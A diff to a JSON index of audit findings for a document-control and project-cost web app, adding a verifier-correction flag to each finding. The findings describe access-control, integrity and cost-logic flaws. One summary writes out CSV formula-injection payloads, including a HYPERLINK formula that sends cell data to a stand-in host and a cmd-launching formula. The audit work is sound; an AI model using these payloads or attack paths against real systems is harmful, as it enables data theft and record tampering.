@@ -45,6 +45,7 @@
         "supabase/migrations/20260903_intake_assignments.sql:5-9,21-22",
         "components/projects/IntakePanel.tsx:409"
       ],
+      "has_verifier_correction": true,
       "summary": "Doc Control assigns P&ID D-25-1042 (a controlled, IFC drawing) to a trusted fabricator's link so they can mark up a tie-in. The fabricator uploads Rev C; it lands in review; Doc Control REJECTS it (IntakePanel.tsx:254-259 sets reviewstate='rejected' and clears pendingversionid — the version row, with intakelinkid set, survives). The fabricator re-uploads the same file. This time linkAuthored is tr",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/05-intake-door.md"
@@ -65,6 +66,7 @@
         "app/api/intake/upload/route.ts:349-358",
         "lib/impact.ts:186-193"
       ],
+      "has_verifier_correction": true,
       "summary": "A trusted vendor publishes Rev D of a controlled P&ID through their link. documentacknowledgments still records the crew as having read-and-understood Rev C, and no new ack roster opens; lib/impact.ts:186-193 will keep reporting pendingDistributionAcks against the old revision's roster. A pipefitter who acknowledged Rev C is never asked to acknowledge Rev D, holds a printed Rev C at the weld, and ",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/05-intake-door.md"
@@ -86,6 +88,7 @@
         "lib/checklists.ts:315-320",
         "lib/checklists.ts:51"
       ],
+      "has_verifier_correction": false,
       "summary": "A contractor's \"E-301 Hydrotest Report Rev 0\" lands in the project intake folder; the sweep greens the PSSR pressure-test item and attaches the citation. Two weeks later the document is found to be the wrong equipment and is set to Void (or deleted, or renamed at revision). Every subsequent sweep leaves the item green — nothing in the codebase ever moves an item from satisfied back to needsevidenc",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/03-quality.md"
@@ -107,6 +110,7 @@
         "lib/projectReport.ts:139",
         "lib/__tests__/costs.test.ts:53-69"
       ],
+      "has_verifier_correction": true,
       "summary": "Using the shape already pinned in lib/tests/costs.test.ts:53-69: account a1 has budget 1000 pinned at 60% (EV 600) with 400 of actuals; account a2 has budget 500 with 500 of actuals and no pin. rollup.cpi = 600/400 = 1.5, rollup.budget = 1500, rollup.spent = 900. computeForecast returns eac = 1500/1.5 = 1000 and vac = -500, and the Costs tab renders \"At this performance you'll finish around $1,000",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/04-cost-and-bids.md"
@@ -129,6 +133,7 @@
         "lib/projectHealth.ts:70-86",
         "lib/projectSnapshot.ts:101"
       ],
+      "has_verifier_correction": true,
       "summary": "A $500,000 piping account has a $480,000 subcontract awarded (awardQuote posts a $480,000 commitment) and no invoices yet. computeCostRollup returns committed 480,000, spent 0, remaining 500,000, overBudget false. The Costs tab shows \"Remaining $500,000\" in emerald with an upward-trend icon; the project health Cost part scores 100 (\"0% of budget spent\"). The owner then approves a $60,000 change or",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/04-cost-and-bids.md"
@@ -149,6 +154,7 @@
         "lib/transitionIn.ts:73-80",
         "components/projects/IntakePanel.tsx:254-259"
       ],
+      "has_verifier_correction": true,
       "summary": "A controller rejects a vendor sheet as unacceptable. Days later, working through the Transition-in list, the same or another controller adopts it — the panel gives no indication it was rejected (it shows number, title, rev and company only, :184-185) — and a rejected drawing enters the controlled library with currentversionid NULL, i.e. a register entry with no approved revision behind it. Adoptin",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/05-intake-door.md"
@@ -167,6 +173,7 @@
         "app/api/intake/upload/route.ts:325",
         "components/projects/IntakePanel.tsx:99-113"
       ],
+      "has_verifier_correction": true,
       "summary": "A vendor submits Rev B; a controller opens the Intake tab, sees it queued, and steps away to check it against the field. The vendor, realising they sent the wrong sheet, uploads Rev C. Rev B is now an orphan: it is gone from the queue, still marked inreview in documentversions, and Rev C is live as the controlled copy having been reviewed by nobody. The controller returns to an empty queue and rea",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/05-intake-door.md"
@@ -187,6 +194,7 @@
         "lib/uniqueness.ts:22-42",
         "lib/transitionIn.ts"
       ],
+      "has_verifier_correction": true,
       "summary": "A contractor submits a sheet numbered D-25-1042 while the org's own D-25-1042 is live. The row inserts with uniquenesskey NULL, so the unique index does not see it. A controller adopts it into the same controlled library — possibly renumbering it, which still leaves the key NULL. The library now holds two non-superseded documents carrying D-25-1042 and the database will never object, because the o",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/05-intake-door.md"
@@ -207,6 +215,7 @@
         "app/api/data-export/destinations/route.ts:13",
         "supabase/migrations/20260902_project_intake.sql:22"
       ],
+      "has_verifier_correction": true,
       "summary": "A Manager configures a scheduled export to their own S3 bucket (destinationtype/endpoint/bucket/accesskeyid are all caller-supplied, destinations/route.ts:24-41) or a webhook. Every nightly run writes the org's complete set of live intake tokens to infrastructure the Manager controls. Each token is a full-power upload credential: with the trusted flag and an assigned document it publishes controll",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/05-intake-door.md"
@@ -226,6 +235,7 @@
         "app/submit/[token]/page.tsx:230",
         "app/api/intake/upload/route.ts:134,137"
       ],
+      "has_verifier_correction": true,
       "summary": "A contractor submits twelve as-built sheets, leaving the optional number field blank on all of them (the fastest way to use the portal). Every sheet scans 'clean' — no number to collide, no tags in the title, no overlaps. A controller sets the destination library and clicks 'Adopt 12 clean'. Twelve unnumbered vendor drawings enter the controlled register having been checked against nothing, three ",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/05-intake-door.md"
@@ -246,6 +256,7 @@
         "supabase/migrations/20261010_signup_rate_limit.sql:1-17",
         "app/submit/[token]/page.tsx:172,244"
       ],
+      "has_verifier_correction": true,
       "summary": "A leaked or shared token — pasted into a vendor's group chat, or lifted from a backup export — is replayed in a loop. Each request writes a document, a version, a notification per controller, a queued email per controller, an audit row and an R2 object. The org's Intake tab fills with thousands of submissions, every Admin/DocCtrl inbox receives thousands of emails (the route kicks the drain synchr",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/05-intake-door.md"
@@ -266,6 +277,7 @@
         "supabase/migrations/20260903_intake_assignments.sql:18-19",
         "components/projects/IntakePanel.tsx:215-220"
       ],
+      "has_verifier_correction": true,
       "summary": "A project owner who is not a controller (the RLS policy admits them) posts another org's document id into assigneddocids. The contractor's portal now lists that foreign document's number, title, rev and status, and the contractor can submit revisions to it. The version rows the route creates carry orgid: orgId (the link's org, upload/route.ts:306) while recordid points at a document owned by a dif",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/05-intake-door.md"
@@ -288,6 +300,7 @@
         "supabase/migrations/20261013_project_controls_program.sql:262-288",
         "supabase/migrations/20260902_project_intake.sql:51-60"
       ],
+      "has_verifier_correction": true,
       "summary": "A repipe project is cancelled after the MOC is withdrawn. Its trusted intake link for 'Gulf Mechanical' was never revoked (revocation is a separate manual click in the Intake tab, and the Intake tab is hidden to non-managers). Two weeks later the contractor uploads 'Rev C' of an ISO they previously submitted. The route publishes it: documents.status='Issued', currentversionid points at an external",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/01-project-model.md"
@@ -308,6 +321,7 @@
         "app/api/intake/resolve/route.ts:105-120",
         "app/api/intake/upload/route.ts:64-92"
       ],
+      "has_verifier_correction": true,
       "summary": "A cancelled project is deleted to tidy the list. The contractor's /submit/<token> page still loads, still shows 'Project', and still lists the six controlled drawings that were assigned to them — document numbers, titles and current revisions — indefinitely, to a party whose engagement ended. Nobody in the org can even see the link any more: IntakePanel only lists links for a project that still ex",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/01-project-model.md"
@@ -330,6 +344,7 @@
         "supabase/migrations/20260614_phase7_milestones.sql:57-61",
         "components/projects/ScheduleImportModal.tsx:156"
       ],
+      "has_verifier_correction": true,
       "summary": "A capital project's schedule is imported from the contractor's P6 file — 400 activities, 12 of them overdue. The Schedule tab shows the execution board and the overdue count. The health strip says 'Schedule — No schedule yet' and scores the project only on cost, and the coach permanently nags 'Add a schedule — import a file or type a few milestones' at weight 95, above everything else, forever. Th",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/01-project-model.md"
@@ -352,6 +367,7 @@
         "lib/projects.ts:1039-1045",
         "app/api/cron/maintenance/route.ts:88-92"
       ],
+      "has_verifier_correction": true,
       "summary": "Pipefitting turnaround project owned by an Engineer (not Admin/DocCtrl). Three ISO drawings are checked out under it — two by a drafter, one by the owner. The job is cancelled; the owner clicks Cancel, types a reason, sees 'Every active checkout on this project will be released', and the project flips to CANCELLED. Every one of the three checkouts is still status='active', documents.checkedoutby s",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/01-project-model.md"
@@ -371,6 +387,7 @@
         "components/providers/RoleContext.tsx:198-213,364-370",
         "app/(protected)/projects/[id]/page.tsx:65-68,131-134"
       ],
+      "has_verifier_correction": true,
       "summary": "A Document Control specialist whose headline role is 'Engineer' (DocCtrl held additively) opens someone else's project. The page shows Pause/Complete/Cancel/Archive/Edit/Delete and the Members tab's Remove and 'Make owner' controls, because hasAnyRole says they are a controller. Every one of those buttons throws 'Only the project owner or an admin can do this.' — even though RLS would have allowed",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/01-project-model.md"
@@ -391,6 +408,7 @@
         "supabase/migrations/20260819_orphan_tables_backfill.sql:141,162,182,205",
         "supabase/migrations/20260609_phase1_normalization.sql:69"
       ],
+      "has_verifier_correction": true,
       "summary": "An Admin cleans up 'old projects'. A completed 2026 turnaround is deleted. Gone with it: the PSSR checklist showing which items were satisfied and by which document, the turnover package acceptance record with reviewer names and dates, 40 punch items, four change orders with reason codes that fed the contractor's permanent score, and the whole cost ledger. Six months later an OSHA PSM audit asks f",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/01-project-model.md"
@@ -411,6 +429,7 @@
         "lib/projects.ts:430-454",
         "lib/projects.ts:680-709"
       ],
+      "has_verifier_correction": true,
       "summary": "A contractor-account Viewer posts a projectactivity row with type:'comment', userid = the Process Safety lead's uid, username = their email, body 'Confirmed with operations — line can stay in service, hold released.' It renders in the Activity tab through TimelineFeed as that person's comment, is picked up by the project timeline (lib/timeline.ts getProjectTimeline reads projectactivity for the pr",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/01-project-model.md"
@@ -430,6 +449,7 @@
         "components/projects/ProjectDocumentsCard.tsx:119-144",
         "app/(protected)/projects/[id]/page.tsx:461-471"
       ],
+      "has_verifier_correction": true,
       "summary": "A Viewer opens devtools on the projects page and issues one PostgREST DELETE against projectdocuments for a private capital-project id. The project's Documents register — including every document adopted through contractor intake, which exists ONLY as a projectdocuments row (the card's own header comment says so) — is emptied. Nothing is audited: ProjectDocumentsCard writes the docadded/docremoved",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/01-project-model.md"
@@ -450,6 +470,7 @@
         "lib/checklists.ts:214-231",
         "lib/checklistEngine.ts:74-79"
       ],
+      "has_verifier_correction": true,
       "summary": "A contractor uploads six files through the tokened intake portal with titles containing \"Weld Log\", \"NDE Report\", \"Hydrotest\", \"MTR\", \"As-Built\" and \"P&ID\". A sweep greens the corresponding six lines of the MI checklist; the owner marks the MI checklist complete (the gate passes — every applicable item is satisfied). The PSSR is then swept: its line \"New equipment reviewed by the mechanical integr",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/03-quality.md"
@@ -474,6 +495,7 @@
         "supabase/migrations/20260820_retention.sql",
         "supabase/migrations/20260826_legal_hold_delete_guard.sql"
       ],
+      "has_verifier_correction": true,
       "summary": "A project owner or any Admin/DocCtrl deletes a completed capital project to tidy the list, reading a confirmation that promises only the schedule will go. Gone in one statement: the completed PSSR with 120 items and their evidence citations, the turnover package with the QA/QC reviewer's name and date on each accepted NDE and MTR package, and the punch history. The PROJECTDELETED audit row says {n",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/03-quality.md"
@@ -495,6 +517,7 @@
         "types/schema.ts:26-46",
         "components/projects/QualityTab.tsx:466-481"
       ],
+      "has_verifier_correction": true,
       "summary": "A PSSR under 29 CFR 1910.119(i) requires the operating and maintenance representatives to confirm procedures, training and equipment. In this system the Operations lead and the mechanical-integrity engineer log in, see the checklist read-only (memberread grants SELECT to any active member), and have no button — canManage is false for them. The project owner clicks every line on their behalf; the r",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/03-quality.md"
@@ -515,6 +538,7 @@
         "components/projects/QualityTab.tsx:455-464",
         "components/projects/QualityTab.tsx:293-319"
       ],
+      "has_verifier_correction": true,
       "summary": "A PSSR is worked for two weeks: the sweep and the reviewers green 40 of 60 items with citations. Someone then re-runs \"Which items apply to this job?\" — a button that stays enabled for the whole life of an open checklist (QualityTab.tsx:373-377) — because the SOW was updated. The model, seeing slightly different context, returns na for eleven previously-satisfied lines. The confirmation says only ",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/03-quality.md"
@@ -536,6 +560,7 @@
         "lib/milestones.ts:657-659",
         "lib/criticalPath.ts:43-49"
       ],
+      "has_verifier_correction": true,
       "summary": "A planner exports Unit 200 Turnaround from MS Project. The file's first task is the project summary (UID 0, name = the project, Start = job start, Finish = job finish, PercentComplete = whole-job %). It imports as a top-level task with no children, so it is counted as a leaf everywhere: totalLeaves is one too many, its weight is added to the denominator of SPI and percent-complete, and because its",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/02-scheduling.md"
@@ -559,6 +584,7 @@
         "lib/scheduleProgress.ts:44-50",
         "lib/executionReport.ts:106"
       ],
+      "has_verifier_correction": true,
       "summary": "A turnaround is imported from P6 with 400 activities. hoursOf returns 0 for all of them (executionReport.ts:106), so plannedHours = 0 and the Report's \"Work hours\" card prints 0 / 0 h with pctHours silently falling back to pctComplete (executionReport.ts:169). Every rollup — buildProgressIndex, overallPercent, computeScheduleMetrics' SPI and earned value, the per-group pctComplete — weights a 200-",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/02-scheduling.md"
@@ -579,6 +605,7 @@
         "components/projects/TaskDetailPanel.tsx:480-483",
         "components/projects/ScheduleTab.tsx:201-215"
       ],
+      "has_verifier_correction": true,
       "summary": "A turnaround plan is baselined at kickoff. Two weeks in, a supervisor drags a phase and confirms the move; the drag path (computeTreeMove → withCascade → applymilestonemoves) writes new planned dates for dozens of rows with no baseline comparison anywhere — the single-task edit form is the only surface that warns (\"+7 days vs the approved plan\", TaskDetailPanel.tsx:482), and grep baselineFinishAt ",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/02-scheduling.md"
@@ -597,6 +624,7 @@
         "supabase/migrations/20260907_milestone_batch_move.sql:49-59",
         "lib/milestones.ts:303-307"
       ],
+      "has_verifier_correction": true,
       "summary": "An unauthenticated request carrying the public anon key calls rpc('applymilestonemoves', {porg, pproject, pmoves}). vuid is NULL, the membership lookup and the role check are both skipped, and the loop rewrites plannedstartat/plannedat on every id supplied, with updatedby = NULL. The caller needs the org, project and milestone UUIDs, which bounds the practical exposure — but a member who has legit",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/02-scheduling.md"
@@ -618,6 +646,7 @@
         "lib/scheduleReflow.ts:159-168",
         "lib/__tests__/scheduleReflowLocks.test.ts:56-92"
       ],
+      "has_verifier_correction": true,
       "summary": "A phase \"Weld spool 12\" has three sub-steps; \"Fit-up\" was completed on 2 Jan and stamped with its actual. \"Weld spool 12\" depends on an upstream task that slips nine days. The cascade pushes the phase forward and drags the completed fit-up's planned window from 2–3 Jan to 11–12 Jan. The batch persists through applymilestonemoves in one transaction. The task now reads: planned 11 Jan, actualat 2 Ja",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/02-scheduling.md"
@@ -640,6 +669,7 @@
         "lib/checklistEngine.ts:200-206",
         "app/(protected)/companies/[id]/page.tsx:216-232"
       ],
+      "has_verifier_correction": false,
       "summary": "A contractor is barred in the registry after a stop-work. Their quote PDF's letterhead reads \"Apex Industrial Services, LLC\" and the model extracts that name; the registry row says \"Apex Industrial\". No match, no badge, no warning — the bid tab flags them best value and the award posts. Separately, a 62-page quality manual is evaluated on its first 10 pages; five of eight rubric areas appear later",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/04-cost-and-bids.md"
@@ -660,6 +690,7 @@
         "lib/costs.ts:332",
         "lib/projectHealth.ts:104-113"
       ],
+      "has_verifier_correction": true,
       "summary": "A $200,000 piping account is pinned to a milestone that is 50% complete (EV $100,000) with $100,000 of actuals — CPI 1.00, forecast on budget. A legitimate $100,000 field-condition CO is proposed, approved, and executed. The commitment rises to $300,000, the budget stays $200,000. When the CO work is invoiced, actuals are $200,000 against EV of $100,000 (still budget x 50%), CPI falls to 0.50, and",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/04-cost-and-bids.md"
@@ -679,6 +710,7 @@
         "lib/bidTab.ts:139",
         "lib/bidTab.ts:118-124"
       ],
+      "has_verifier_correction": false,
       "summary": "Two bids at $200,000 each. Bidder A states 2,000 hours ($100/hr); Bidder B pads its quote to 4,000 hours ($50/hr). minDph = 50, so A's manpower part is 50 and B's is 100 — a 15-point swing at the default 0.3 weight, enough to flip \"best value\" onto a bid whose only distinguishing claim is a self-reported, AI-extracted number. Separately, in a three-bid field where only the most thorough bidder wri",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/04-cost-and-bids.md"
@@ -699,6 +731,7 @@
         "supabase/migrations/20261013_project_controls_program.sql:262-266",
         "app/(protected)/projects/[id]/page.tsx:134"
       ],
+      "has_verifier_correction": true,
       "summary": "A project owner proposes CO-004 for $340,000 coded fieldcondition against a contractor they also manage, then clicks Approve in the same session. decideChangeOrder claims the row and posts a $340,000 commitment. auditlogs records CHANGEORDERPROPOSED and CHANGEORDERAPPROVED with the same userid minutes apart, but nothing prevented it, nothing routed it to a second signer, and no dollar threshold es",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/04-cost-and-bids.md"
@@ -719,6 +752,7 @@
         "lib/changeOrders.ts:5-8",
         "components/projects/cost/ChangeOrdersPanel.tsx:159-161"
       ],
+      "has_verifier_correction": true,
       "summary": "A contractor bids $500,000 and executes it exactly. The plant then issues two ownerrequest COs totalling $125,000 for scope the plant itself added, both approved. growth = 0.25, gapShare = 0 (no scopegap COs), score = clamp(100 - 0.25250) = 37.5, banded \"Concern\" (lib/companyScore.ts:173), with the detail \"25% cost growth over bid · 2 change orders\". That number sits in the composite and appears b",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/04-cost-and-bids.md"
@@ -742,6 +776,7 @@
         "components/projects/CostsTab.tsx:489",
         "app/api/projects/cost-docs/route.ts:129"
       ],
+      "has_verifier_correction": true,
       "summary": "Two bids arrive for the same RFQ group: a US fabricator at USD 195,000 and a European vendor at EUR 168,000. The model correctly extracts currency \"EUR\" for the second. The bid tab prints \"$168,000\" and \"$195,000\", scores the EUR bid 100 on price and flags it best value; the confirm dialog reads \"Award ... for $168,000\". awardQuote posts a 168,000 commitment to a USD budget line. At roughly 1.09 U",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/04-cost-and-bids.md"
@@ -763,6 +798,7 @@
         "supabase/migrations/20261013_project_controls_program.sql:130",
         "lib/costDocs.ts:6-9"
       ],
+      "has_verifier_correction": false,
       "summary": "A controller discovers that CO-007 was approved against the wrong contractor and needs the $84,000 commitment removed. The CO row offers no unwind, postedentryid is not exposed anywhere in the UI or the type, and the cost entry it created carries no back-reference to the CO or to the awarded quote. The only handle is the entry's description text (${co.coNumber} — ${co.title}, lib/changeOrders.ts:1",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/04-cost-and-bids.md"
@@ -783,6 +819,7 @@
         "lib/costs.ts:246-257",
         "lib/costDocs.ts:308-309"
       ],
+      "has_verifier_correction": false,
       "summary": "A project owner whose account is compromised, or who simply wants an uncomfortable number gone, issues a DELETE against costentries through PostgREST with their own JWT — the same anon key and session the app already uses for direct client writes to changeorders (components/projects/cost/ChangeOrdersPanel.tsx:59). The rows vanish from the rollup, the S-curve, and the close-out report, with no stri",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/04-cost-and-bids.md"
@@ -802,6 +839,7 @@
         "lib/changeOrders.ts:176-188",
         "lib/costs.ts:111-117"
       ],
+      "has_verifier_correction": true,
       "summary": "Three bids are grouped under one RFQ group. A controller awards the first; the commitment posts; the rival-decline UPDATE fails (a transient network error, or an RLS evaluation the client cannot see). awardQuote returns ok and the panel refreshes. The other two still read 'parsed', so the Award button stays live on both. A second controller — or the same one on a different day — awards a second bi",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/04-cost-and-bids.md"
@@ -827,6 +865,7 @@
         "lib/turnover.ts:174",
         "lib/turnover.ts:253"
       ],
+      "has_verifier_correction": true,
       "summary": "A controller opens a contractor's company profile expecting the record the bid tab promises to show beside every price. Quality shows \"No quality evidence yet\" because turnoveritems.partyid is null for every item. Cost discipline shows \"No awarded work yet\" because the wizard-created party that carries companyid has contractvalue null. Bids is empty because costdocuments.partyid is null. Schedule ",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/04-cost-and-bids.md"
@@ -850,6 +889,7 @@
         "lib/costDocs.ts:226",
         "lib/costDocs.ts:280"
       ],
+      "has_verifier_correction": true,
       "summary": "A vendor submits a 14-page quote whose page 6 shows a base-scope subtotal of $182,000 and whose page 11 carries the bid summary of $431,000 including alternates and escalation. Pages 9-14 are never rendered. The model returns total 182000, totalamount is set to 182000, the bid tab shows the vendor at $182,000 against rivals near $430,000 and flags it \"best value\" on price. A controller clicks Awar",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/04-cost-and-bids.md"
@@ -869,6 +909,7 @@
         "components/projects/cost/QuotesPanel.tsx:172-174",
         "components/projects/cost/QuotesPanel.tsx:360-362"
       ],
+      "has_verifier_correction": true,
       "summary": "Two controllers have the project's Costs tab open. Controller A awards a quote — status becomes 'awarded' and a $182,000 commitment posts. Controller B, whose tab still shows the quote as 'parsed', clicks Void on it. voidCostDoc reads the stale parsed status, passes its own guard, and unconditionally writes status='void'. The quote now shows \"Void\" and disappears from quoteGroups (lib/costDocs.ts:",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/04-cost-and-bids.md"
@@ -890,6 +931,7 @@
         "lib/notifications.ts:50-89",
         "lib/transitionIn.ts:335-354"
       ],
+      "has_verifier_correction": true,
       "summary": "A Doc Control lead who has switched email off entirely (emailenabled: false) still receives an email for every external submission, from a route that believes it is honouring their setting. Meanwhile an engineer who is watching the specific drawing a contractor just superseded receives nothing, because the route resolves no followers. In a burst (see the throttling finding) the missing dedupe mean",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/05-intake-door.md"
@@ -909,6 +951,7 @@
         "app/api/intake/upload/route.ts:307,325",
         "app/submit/[token]/page.tsx:173,245"
       ],
+      "has_verifier_correction": true,
       "summary": "A contractor uploads plan.html with Content-Type: text/html. It is stored with that type and served from a presigned R2 GET (app/api/storage/download-url) with no ResponseContentDisposition override, so an internal reviewer opening it gets script execution in the bucket's origin rather than a document preview. Separately, a submission with a 5 MB title string bloats the documents row and every lis",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/05-intake-door.md"
@@ -928,6 +971,7 @@
         "components/projects/IntakePanel.tsx:62-64,354-359",
         "components/projects/QuotesPanel.tsx:546-548"
       ],
+      "has_verifier_correction": true,
       "summary": "A buyer creates quote links for five bidders. The award goes out; the losing bidders' links stay live forever. Months later a bidder replays their link and submits a new 'quote' that appears in the project's bid tabulation with status: 'draft' → the portal shows it 'under review' — for an award already made. To stop it, the buyer must know to go to a different tab, where the link is presented as a",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/05-intake-door.md"
@@ -947,6 +991,7 @@
         "app/api/intake/upload/route.ts:231-240",
         "app/submit/[token]/page.tsx:96,101"
       ],
+      "has_verifier_correction": true,
       "summary": "Two contractors submit within the same second against a project whose intake folder does not exist yet. Both see intakecollectionid NULL, both insert a collection, and the library now holds two folders called 'Intake — Unit 4 Revamp'. projects.intakecollectionid points at one of them, so TransitionInPanel (listTransitionCandidates(orgId, intakeCollectionId), transitionIn.ts:76-77) scans only that ",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/05-intake-door.md"
@@ -966,6 +1011,7 @@
         "supabase/migrations/20260930_semantic_layer.sql:119-120",
         "app/api/intake/upload/route.ts:121,214,393"
       ],
+      "has_verifier_correction": true,
       "summary": "Anyone who can reach the PostgREST endpoint calls bumpintakeuse in a loop with a guessed or observed link UUID. submissioncount and lastusedat are the org's only at-a-glance record of contractor portal activity — they are rendered directly in the Intake tab (IntakePanel.tsx:348) and the Costs tab (QuotesPanel.tsx:551), and feed the vendor responsiveness view (lib/companies.ts:252 selects submissio",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/05-intake-door.md"
@@ -985,6 +1031,7 @@
         "app/(protected)/projects/page.tsx:61-88",
         "lib/projects.ts:199-230"
       ],
+      "has_verifier_correction": true,
       "summary": "A five-person project runs for three weeks: daily comments, documents attached, members joining — all by collaborators, none by the owner. projects.lastactivityat still holds the creation timestamp. The projects list is ordered .order(\"lastactivityat\", { ascending: false }) (lib/projects.ts:204), so the most active job in the plant sinks to the bottom of the Active tab, below dormant projects whos",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/01-project-model.md"
@@ -1005,6 +1052,7 @@
         "app/(protected)/projects/[id]/page.tsx:323-331",
         "app/(protected)/projects/page.tsx:103-114"
       ],
+      "has_verifier_correction": true,
       "summary": "Any active org member creates a project (permitted by projectsinsertmember) named =HYPERLINK(\"https://evil.example/?d=\"&A2,\"Open budget\") or a checkout purpose beginning with =cmd|'/C calc'!A1. A controller clicks Export All, opens projects-2026-08-22.csv in Excel and clicks through the enable-content prompt. The formula executes with the reviewer's credentials — exfiltrating adjacent cells via HY",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/01-project-model.md"
@@ -1026,6 +1074,7 @@
         "supabase/migrations/20260913_projects_rls_recursion_fix.sql:74-86",
         "supabase/migrations/20260527_projects_and_collaboration.sql:61-62"
       ],
+      "has_verifier_correction": true,
       "summary": "A project owner adds an outside-department reviewer as an 'observer', reasonably believing that means read-only. The observer posts comments into the project's regulated activity feed, and (because canManage is separate) is otherwise indistinguishable from a collaborator. Later, a controller sets a member's role to 'owner' to reflect a real handover but does not use 'Make owner'; the roster now sh",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/01-project-model.md"
@@ -1046,6 +1095,7 @@
         "lib/projectReport.ts:192-195",
         "lib/costs.ts:303-333"
       ],
+      "has_verifier_correction": true,
       "summary": "A project manager pins every budget line to a schedule task specifically to unlock CPI — the coach told them it would ('Pin budget lines to schedule tasks … Unlocks Cost health (CPI)', projectHealth.ts:192-197). The Costs tab and the health dial show CPI 0.91. They click Report to take the boss brief into the monthly review. The Money section shows budget, committed, spent, remaining — and no CPI ",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/01-project-model.md"
@@ -1064,6 +1114,7 @@
         "components/projects/ProjectWizard.tsx:141-150",
         "components/projects/ProjectWizard.tsx:198-206"
       ],
+      "has_verifier_correction": true,
       "summary": "A superintendent spends ten minutes in the wizard entering a $305k budget across four accounts, five milestones and three contractors. costaccounts insert is rejected (an RLS edge, a CHECK on costtype, a numeric overflow — anything). The wizard routes them to the project page, which shows the coach saying 'Add a budget (2 min) — unlocks the burn bar, the S-curve, and the finish-cost forecast' and ",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/01-project-model.md"
@@ -1082,6 +1133,7 @@
         "supabase/migrations/20260906_projects_hardening.sql:62,68,76,95,124,171",
         "supabase/migrations/20261013_project_controls_program.sql:238,246,264,269,274,281,286"
       ],
+      "has_verifier_correction": true,
       "summary": "Any role that can create objects in a schema that precedes public on the searchpath (or any future migration, extension or tooling that alters the default searchpath for a role) can shadow orgmembers with a view of its own. Because the function is SECURITY DEFINER, the shadowed lookup runs with the definer's privileges and returns true, and the caller becomes a controller for every projects, proje",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/01-project-model.md"
@@ -1102,6 +1154,7 @@
         "supabase/migrations/20261013_project_controls_program.sql:165-167",
         "lib/checklists.ts:192-196"
       ],
+      "has_verifier_correction": true,
       "summary": "A regulator points at line 27 of the completed PSSR — \"NDE performed and reports reviewed\" — and asks who verified it and when. The row says status: satisfied, updatedat: 2026-08-14T14:32Z, updatedbyname: 'mreyes' (from an unrelated N/A decision three weeks earlier), evidence Document on file: \"NDE Report\". mreyes did not verify it; a regex did. The audit trail holds one CHECKLISTAUTOEVIDENCE row ",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/03-quality.md"
@@ -1122,6 +1175,7 @@
         "components/projects/QualityTab.tsx:685-701",
         "supabase/migrations/20261013_project_controls_program.sql:191-204"
       ],
+      "has_verifier_correction": true,
       "summary": "A regulator or an incoming shift asks who verified that \"Reinstall insulation at E-301 north nozzle\" was actually reinstalled, and what was done. The screen shows a struck-through line with the creator's name. The database holds a closedby uuid no code path resolves to a name and no surface displays. The only other trace is a PUNCHSTATUS audit row, which per SAF-6 never reaches the project's Activ",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/03-quality.md"
@@ -1142,6 +1196,7 @@
         "app/(protected)/projects/[id]/page.tsx:192-200",
         "components/projects/QualityTab.tsx:335-341"
       ],
+      "has_verifier_correction": true,
